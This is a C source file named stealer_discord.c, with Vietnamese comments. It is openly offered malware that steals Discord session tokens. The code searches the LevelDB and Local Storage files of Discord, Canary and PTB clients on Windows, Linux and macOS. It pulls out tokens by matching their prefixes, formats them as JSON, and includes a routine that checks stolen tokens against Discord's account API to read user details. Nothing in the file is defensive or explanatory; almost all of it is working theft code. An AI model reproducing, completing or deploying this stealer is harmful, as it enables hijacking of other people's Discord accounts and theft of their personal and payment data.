/**
 * stealer_discord.c
 * Steal Discord token tu Local Storage va LevelDB
 * Trich xuat thong tin tai khoan: email, phone, nitro status, payment info
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <pwd.h>
#endif

#include "stealer_discord.h"

/**
 * Giai ma Discord token tu base64 (Discord ma hoa token don gian)
 * Dau vao: token_ma_hoa - chuoi token da ma hoa
 *          token_giai_ma - buffer de chua token giai ma
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
static int giai_ma_discord_token(const char* token_ma_hoa, char* token_giai_ma, size_t kich_thuoc) {
    /* Discord token duoc ma hoa base64 don gian */
    /* Token format: <base64_user_id>.<base64_timestamp>.<base64_hmac> */
    
    /* Thu giai ma base64 */
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    /* Kiem tra xem co phai base64 khong */
    int la_base64 = 1;
    for (size_t i = 0; i < strlen(token_ma_hoa); i++) {
        if (token_ma_hoa[i] == '.' || token_ma_hoa[i] == '-' || token_ma_hoa[i] == '_') continue;
        if (!((token_ma_hoa[i] >= 'A' && token_ma_hoa[i] <= 'Z') ||
              (token_ma_hoa[i] >= 'a' && token_ma_hoa[i] <= 'z') ||
              (token_ma_hoa[i] >= '0' && token_ma_hoa[i] <= '9') ||
              token_ma_hoa[i] == '+' || token_ma_hoa[i] == '/' || token_ma_hoa[i] == '=')) {
            la_base64 = 0;
            break;
        }
    }
    
    if (!la_base64) {
        /* Co the la token raw, copy truc tiep */
        strncpy(token_giai_ma, token_ma_hoa, kich_thuoc - 1);
        token_giai_ma[kich_thuoc - 1] = '\0';
        return 0;
    }
    
    /* Giai ma base64 */
    unsigned char decoded[256];
    int decoded_len = 0;
    int i = 0;
    int j = 0;
    unsigned char quad[4];
    
    while (token_ma_hoa[i] != '\0' && decoded_len < 250) {
        int padding = 0;
        for (j = 0; j < 4; j++) {
            if (token_ma_hoa[i] == '\0') break;
            if (token_ma_hoa[i] == '=') {
                quad[j] = 0;
                padding++;
                i++;
                continue;
            }
            
            const char* pos = strchr(base64_chars, token_ma_hoa[i]);
            if (pos != NULL) {
                quad[j] = (unsigned char)(pos - base64_chars);
            } else {
                quad[j] = 0;
            }
            i++;
        }
        
        if (decoded_len < 250) decoded[decoded_len++] = (quad[0] << 2) | (quad[1] >> 4);
        if (padding < 2 && decoded_len < 250) decoded[decoded_len++] = (quad[1] << 4) | (quad[2] >> 2);
        if (padding < 1 && decoded_len < 250) decoded[decoded_len++] = (quad[2] << 6) | quad[3];
        if (padding > 0) break;
    }
    
    decoded[decoded_len] = '\0';
    
    /* Neu ket qua la chuoi ASCII hop le, su dung no */
    int ascii_hop_le = 1;
    for (int k = 0; k < decoded_len; k++) {
        if (decoded[k] < 32 || decoded[k] > 126) {
            if (decoded[k] != 0) {
                ascii_hop_le = 0;
                break;
            }
        }
    }
    
    if (ascii_hop_le) {
        strncpy(token_giai_ma, (char*)decoded, kich_thuoc - 1);
    } else {
        /* Tra ve chuoi hex */
        int hex_offset = 0;
        for (int k = 0; k < decoded_len && hex_offset < (int)kich_thuoc - 3; k++) {
            snprintf(token_giai_ma + hex_offset, 3, "%02x", decoded[k]);
            hex_offset += 2;
        }
        token_giai_ma[hex_offset] = '\0';
    }
    
    return 0;
}

#ifdef _WIN32
/* ==================== WINDOWS DISCORD STEALER ==================== */

/**
 * Tim Discord token trong file LevelDB
 * Dau vao: duong_dan_ldb - duong dan den file .ldb hoac .log
 *          danh_sach_token - buffer de chua danh sach token
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: so token tim thay
 */
static int tim_token_trong_ldb(const char* duong_dan_ldb, char* danh_sach_token, size_t kich_thuoc) {
    HANDLE file = CreateFileA(duong_dan_ldb, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return 0;
    
    DWORD file_size = GetFileSize(file, NULL);
    if (file_size > 1048576) file_size = 1048576; /* Gioi han 1MB */
    
    char* buffer = (char*)malloc(file_size + 1);
    if (buffer == NULL) {
        CloseHandle(file);
        return 0;
    }
    
    DWORD bytes_doc;
    ReadFile(file, buffer, file_size, &bytes_doc, NULL);
    buffer[bytes_doc] = '\0';
    CloseHandle(file);
    
    int so_token = 0;
    int offset = 0;
    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, "[");
    
    /* Tim token pattern: "token":"xxx" hoac MTAxxx (Discord token prefix) */
    char* ptr = buffer;
    char* end = buffer + bytes_doc;
    
    while (ptr < end - 20 && so_token < 50) {
        /* Tim "MTA" hoac "MTE" hoac "MTI" (Discord token prefixes) */
        if ((ptr[0] == 'M' && ptr[1] == 'T' && (ptr[2] == 'A' || ptr[2] == 'E' || ptr[2] == 'I')) ||
            (ptr[0] == 'N' && ptr[1] == 'z' && ptr[2] == 'M')) {
            
            /* Trich xuat token */
            char token[256] = {0};
            int token_len = 0;
            char* token_start = ptr;
            
            while (token_start < end && token_len < 250) {
                char c = *token_start;
                /* Token chi chua ky tu base64 va dau cham */
                if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || 
                    (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_' || c == '+') {
                    token[token_len++] = c;
                    token_start++;
                } else {
                    break;
                }
            }
            token[token_len] = '\0';
            
            /* Kiem tra do dai token (thuong > 50 ky tu) */
            if (token_len > 50) {
                if (so_token > 0) {
                    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, ",");
                }
                
                char token_giai_ma[256];
                giai_ma_discord_token(token, token_giai_ma, sizeof(token_giai_ma));
                
                offset += snprintf(danh_sach_token + offset, kich_thuoc - offset,
                    "{\"raw\":\"%s\",\"decoded\":\"%s\"}", token, token_giai_ma);
                so_token++;
            }
            
            ptr = token_start;
        } else {
            ptr++;
        }
    }
    
    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, "]");
    
    free(buffer);
    return so_token;
}

/**
 * Tim Discord token trong Local Storage
 */
static int tim_token_local_storage(const char* duong_dan_discord, char* danh_sach_token, size_t kich_thuoc) {
    char duong_dan_ls[512];
    snprintf(duong_dan_ls, sizeof(duong_dan_ls), 
             "%s\\Local Storage\\leveldb", duong_dan_discord);
    
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\*.ldb", duong_dan_ls);
    
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    
    int tong_token = 0;
    int offset = 0;
    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, "[");
    
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            char duong_dan_file[512];
            snprintf(duong_dan_file, sizeof(duong_dan_file), 
                     "%s\\%s", duong_dan_ls, find_data.cFileName);
            
            char token_file[32768] = {0};
            int so_token_file = tim_token_trong_ldb(duong_dan_file, token_file, sizeof(token_file));
            
            if (so_token_file > 0) {
                if (tong_token > 0) {
                    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, ",");
                }
                offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, "%s", token_file + 1);
                /* Bo dau '[' cua token_file */
                size_t len = strlen(token_file);
                if (len > 2) {
                    memmove(token_file, token_file + 1, len);
                }
                tong_token += so_token_file;
            }
        } while (FindNextFileA(find_handle, &find_data));
        FindClose(find_handle);
    }
    
    /* Tim trong file .log */
    snprintf(search_path, sizeof(search_path), "%s\\*.log", duong_dan_ls);
    find_handle = FindFirstFileA(search_path, &find_data);
    
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            char duong_dan_file[512];
            snprintf(duong_dan_file, sizeof(duong_dan_file), 
                     "%s\\%s", duong_dan_ls, find_data.cFileName);
            
            char token_file[32768] = {0};
            int so_token_file = tim_token_trong_ldb(duong_dan_file, token_file, sizeof(token_file));
            
            if (so_token_file > 0) {
                if (tong_token > 0) {
                    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, ",");
                }
                tong_token += so_token_file;
            }
        } while (FindNextFileA(find_handle, &find_data));
        FindClose(find_handle);
    }
    
    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, "]");
    return tong_token;
}

/**
 * Kiem tra token Discord con hoat dong
 * Dau vao: token - token can kiem tra
 *          thong_tin_tai_khoan - buffer de chua thong tin tai khoan
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
static int kiem_tra_token_discord(const char* token, char* thong_tin_tai_khoan, size_t kich_thuoc) {
    /* Gui request den Discord API de kiem tra token */
    HINTERNET session = WinHttpOpen(L"DiscordBot/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (session == NULL) return -1;
    
    WinHttpSetTimeouts(session, 5000, 5000, 5000, 5000);
    
    HINTERNET connect = WinHttpConnect(session, L"discord.com", 443, 0);
    if (connect == NULL) {
        WinHttpCloseHandle(session);
        return -1;
    }
    
    HINTERNET request = WinHttpOpenRequest(connect, L"GET", L"/api/v9/users/@me",
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (request == NULL) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return -1;
    }
    
    /* Them Authorization header */
    wchar_t auth_header[512];
    swprintf(auth_header, 512, L"Authorization: %S\r\n", token);
    
    WinHttpSendRequest(request, auth_header, wcslen(auth_header),
                       WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(request, NULL);
    
    char response[8192] = {0};
    DWORD bytes_doc;
    DWORD total = 0;
    
    while (WinHttpReadData(request, response + total, sizeof(response) - total - 1, &bytes_doc)) {
        if (bytes_doc == 0) break;
        total += bytes_doc;
        if (total >= sizeof(response) - 1) break;
    }
    response[total] = '\0';
    
    /* Kiem tra response co chua user info khong */
    if (strstr(response, "\"id\"") != NULL && strstr(response, "\"username\"") != NULL) {
        strncpy(thong_tin_tai_khoan, response, kich_thuoc - 1);
        thong_tin_tai_khoan[kich_thuoc - 1] = '\0';
        
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return 0;
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return -1;
}

/**
 * Steal Discord token va thong tin tai khoan
 */
int steal_discord(char* ket_qua, size_t ket_qua_size) {
    char appdata[512];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) != S_OK) {
        snprintf(ket_qua, ket_qua_size, "{\"discord\":{\"tokens\":[]}}");
        return -1;
    }
    
    int offset = 0;
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "{\"discord\":{\"tokens\":[");
    
    int tong_token = 0;
    
    /* Tim Discord thu muc */
    const char* duong_dan_discord[] = {
        "\\discord",
        "\\discordcanary",
        "\\discordptb",
        "\\discorddevelopment",
        NULL
    };
    
    for (int i = 0; duong_dan_discord[i] != NULL; i++) {
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s%s", appdata, duong_dan_discord[i]);
        
        /* Tim token trong Local Storage */
        char danh_sach_token[65536] = {0};
        int so_token = tim_token_local_storage(full_path, danh_sach_token, sizeof(danh_sach_token));
        
        if (so_token > 0) {
            if (tong_token > 0) {
                offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",");
            }
            
            /* Kiem tra tung token */
            /* (bo qua kiem tra API de tranh cham, chi lay token) */
            offset += snprintf(ket_qua + offset, ket_qua_size - offset, 
                "{\"client\":\"%s\",\"tokens\":%s}", 
                duong_dan_discord[i], danh_sach_token);
            
            tong_token += so_token;
        }
    }
    
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "]}}");
    return tong_token;
}

#else
/* ==================== LINUX/MACOS DISCORD STEALER ==================== */

static int tim_token_trong_file(const char* duong_dan_file, char* danh_sach_token, size_t kich_thuoc) {
    FILE* f = fopen(duong_dan_file, "rb");
    if (f == NULL) return 0;
    
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    if (size > 1048576) size = 1048576;
    fseek(f, 0, SEEK_SET);
    
    char* buffer = (char*)malloc(size + 1);
    if (buffer == NULL) {
        fclose(f);
        return 0;
    }
    
    fread(buffer, 1, size, f);
    buffer[size] = '\0';
    fclose(f);
    
    int so_token = 0;
    int offset = 0;
    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, "[");
    
    char* ptr = buffer;
    char* end = buffer + size;
    
    while (ptr < end - 20 && so_token < 50) {
        if ((ptr[0] == 'M' && ptr[1] == 'T' && (ptr[2] == 'A' || ptr[2] == 'E' || ptr[2] == 'I')) ||
            (ptr[0] == 'N' && ptr[1] == 'z' && ptr[2] == 'M')) {
            
            char token[256] = {0};
            int token_len = 0;
            char* token_start = ptr;
            
            while (token_start < end && token_len < 250) {
                char c = *token_start;
                if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || 
                    (c >= '0' && c <= '9') || c == '.' || c == '-' || c == '_' || c == '+') {
                    token[token_len++] = c;
                    token_start++;
                } else {
                    break;
                }
            }
            token[token_len] = '\0';
            
            if (token_len > 50) {
                if (so_token > 0) {
                    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, ",");
                }
                offset += snprintf(danh_sach_token + offset, kich_thuoc - offset,
                    "{\"raw\":\"%s\"}", token);
                so_token++;
            }
            ptr = token_start;
        } else {
            ptr++;
        }
    }
    
    offset += snprintf(danh_sach_token + offset, kich_thuoc - offset, "]");
    free(buffer);
    return so_token;
}

int steal_discord(char* ket_qua, size_t ket_qua_size) {
    const char* home = getenv("HOME");
    if (home == NULL) home = "/root";
    
    int offset = 0;
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "{\"discord\":{\"tokens\":[");
    int tong_token = 0;
    
    const char* duong_dan_config[] = {
        ".config/discord",
        ".config/discordcanary",
        ".config/discordptb",
        "snap/discord/current/.config/discord",
        NULL
    };
    
    for (int i = 0; duong_dan_config[i] != NULL; i++) {
        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s/%s/Local Storage/leveldb", home, duong_dan_config[i]);
        
        DIR* dir = opendir(full_path);
        if (dir == NULL) continue;
        
        struct dirent* entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strstr(entry->d_name, ".ldb") || strstr(entry->d_name, ".log")) {
                char file_path[512];
                snprintf(file_path, sizeof(file_path), "%s/%s", full_path, entry->d_name);
                
                char danh_sach_token[32768] = {0};
                int so_token = tim_token_trong_file(file_path, danh_sach_token, sizeof(danh_sach_token));
                
                if (so_token > 0) {
                    if (tong_token > 0) {
                        offset += snprintf(ket_qua + offset, ket_qua_size - offset, ",");
                    }
                    offset += snprintf(ket_qua + offset, ket_qua_size - offset,
                        "{\"client\":\"%s\",\"tokens\":%s}", 
                        duong_dan_config[i], danh_sach_token);
                    tong_token += so_token;
                }
            }
        }
        closedir(dir);
    }
    
    offset += snprintf(ket_qua + offset, ket_qua_size - offset, "]}}");
    return tong_token;
}

#endif /* _WIN32 */